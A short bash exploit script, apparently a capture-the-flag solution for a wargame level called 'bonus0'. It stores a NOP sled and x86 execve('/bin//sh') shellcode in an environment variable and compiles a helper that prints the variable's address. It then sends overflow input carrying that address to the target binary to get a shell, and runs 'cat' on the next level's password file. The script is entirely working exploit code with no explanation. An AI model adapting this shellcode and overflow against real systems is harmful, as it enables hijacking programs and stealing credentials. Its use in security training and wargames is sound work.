#!/bin/bash
export SHELLCODE=$(python -c 'print "\x90"*8000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')

cat << EOF > /tmp/find_env_addr.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
  printf("0x%lx\n", getenv("SHELLCODE"));
  return 0;
}
EOF
cc -o /tmp/find_env_addr /tmp/find_env_addr.c
A=$(/tmp/find_env_addr)
(python -c "print 'A'*200" ; python -c "import struct; print 9 * 'A' + struct.pack('I', $A) + 40 * 'A'";echo "cat /home/user/bonus1/.pass") | ~/bonus0